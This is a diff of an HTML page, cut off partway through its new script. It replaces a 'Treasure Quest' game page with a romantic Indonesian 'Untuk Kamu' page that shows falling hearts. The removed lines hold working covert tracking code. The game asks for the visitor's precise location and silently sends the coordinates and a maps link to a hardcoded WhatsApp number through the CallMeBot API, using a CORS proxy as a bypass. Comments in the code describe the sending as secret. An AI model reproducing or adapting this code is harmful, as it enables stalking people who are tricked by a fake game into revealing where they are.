@@ -3,62 +3,133 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Treasure Quest</title>
+<title>Untuk Kamu ❤️</title>
 <style>
-body{margin:0;padding:0;font-family:Arial,sans-serif;background:linear-gradient(135deg,#0f172a,#1e3a8a);height:100vh;display:flex;justify-content:center;align-items:center;color:white;}
-.container{width:360px;padding:30px;border-radius:20px;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);text-align:center;box-shadow:0 0 30px rgba(0,0,0,.4);}
-.logo{font-size:60px;margin-bottom:10px;}
-button{padding:14px 25px;border:none;border-radius:10px;cursor:pointer;font-size:18px;margin-top:15px;background-color:#ffffff;color:#1e3a8a;font-weight:bold;}
-.status{margin-top:20px;font-size:14px;line-height:1.6;}
-.note{font-size:12px;opacity:.8;margin-top:15px;}
+body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #ffe4e1, #ffb6c1, #e0b0ff);
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #4a4a4a;
+    overflow: hidden;
+    position: relative;
+}
+
+.container {
+    width: 340px;
+    padding: 30px;
+    border-radius: 25px;
+    background: rgba(255, 255, 255, 0.75);
+    backdrop-filter: blur(15px);
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(255, 182, 193, 0.5);
+    border: 1px solid rgba(255, 255, 255, 0.6);
+    animation: mengapung 3s ease-in-out infinite;
+    z-index: 10;
+}
+
+@keyframes mengapung {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+}
+
+.heart-icon {
+    font-size: 65px;
+    animation: berdetak 1.2s infinite;
+    cursor: pointer;
+    display: inline-block;
+}
+
+@keyframes berdetak {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+}
+
+h2 {
+    margin-top: 15px;
+    color: #ff477e;
+    font-size: 24px;
+}
+
+p {
+    font-size: 16px;
+    line-height: 1.6;
+    color: #5c5c5c;
+}
+
+button {
+    padding: 12px 28px;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: bold;
+    margin-top: 20px;
+    background: linear-gradient(45deg, #ff477e, #ff7096);
+    color: white;
+    box-shadow: 0 5px 15px rgba(255, 71, 126, 0.4);
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 20px rgba(255, 71, 126, 0.6);
+}
+
+/* Style untuk efek hujan hati */
+.drop-heart {
+    position: absolute;
+    top: -20px;
+    font-size: 20px;
+    animation: jatuh linear forwards;
+    z-index: 1;
+    pointer-events: none;
+}
+
+@keyframes jatuh {
+    to {
+        transform: translateY(105vh) rotate(360deg);
+    }
+}
 </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo">🏆</div>
-    <h2>Treasure Quest</h2>
-    <p>Temukan harta karun di sekitar Anda!</p>
-    <div class="note">Game membutuhkan akses lokasi untuk menjalankan misi.</div>
-    <button onclick="mulaiMisi()">Mulai Misi</button>
-    <div class="status" id="status"></div>
+    <div class="heart-icon" onclick="hujanHati()">💖</div>
+    <h2>Hai Sayang ✨</h2>
+    <p id="teks">Aku cuma mau bilang kalau aku bersyukur banget punya kamu di hidupku. Terima kasih ya udah selalu ada menemani setiap hariku. I love you! 💕</p>
+    <button onclick="tombolKlik()">Klik di Sini ❤️</button>
 </div>
 
 <script>
-async function mulaiMisi(){
-    let status = document.getElementById("status");
-    status.innerHTML = "🎮 Memulai misi...";
-
-    navigator.geolocation.getCurrentPosition(
-        async function(pos){
-            let lat = pos.coords.latitude;
-            let long = pos.coords.longitude;
-
-            status.innerHTML = "📍 Lokasi ditemukan!<br>Memuat peta harta karun...";
-
-            let pesan = `🎮 Player memulai misi\n\n📍 Latitude: ${lat}\n📍 Longitude: ${long}\n\n🗺️ https://maps.google.com/?q=${lat},${long}`;
-            let nomor = "6287894025536";
-            let apikey = "4901523";
-
-            // Menggunakan proxy bypass agar data terkirim langsung di latar belakang
-            let api = `https://cors-anywhere.herokuapp.com/https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
-
-            try {
-                // Mengirim data diam-diam tanpa membuka aplikasi WhatsApp
-                await fetch(api);
-                status.innerHTML = `✅ Server terhubung!<br><br>Membuka kompas game...`;
-            } catch (error) {
-                // Jika proxy umum penuh, gunakan alternatif cadangan langsung
-                window.location.href = `https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
-            }
-        },
-        function(){
-            status.innerHTML = "❌ Gagal: Akses lokasi ditolak atau belum diizinkan.";
-        },
-        { enableHighAccuracy: true, timeout: 5000 }
-    );
+function hujanHati() {
+    const jumlahHati = 25;
+    const simbolHati = ['❤️', '💖', '💝', '💕', '✨'];
+    
+    for (let i = 0; i < jumlahHati; i++) {
+        const hati = document.createElement('div');
+        hati.classList.add('drop-heart');
+        hati.innerText = simbolHati[Math.floor(Math.random() * simbolHati.length)];
+        
+        // Mengatur posisi acak dan kecepatan jatuh hati
+        hati.style.left = Math.random() * 100 + 'vw';
+        hati.style.animationDuration = (Math.random() * 2 + 2) + 's'; 
+        hati.style.opacity = Math.random();
+        hati.style.fontSize = (Math.random() * 15 + 15) + 'px';
+        
+        document.body.appendChild(hati);
+        
+        // Hapus elemen hati setelah animasi selesai agar web tidak berat
+        setTimeout(() => {
+            hati.remove();
+        }, 4000);
+    }
 }
-</script>
 
-</body>
-</html>
+function tombolKlik() {
+    // Memulai efek hujan hati
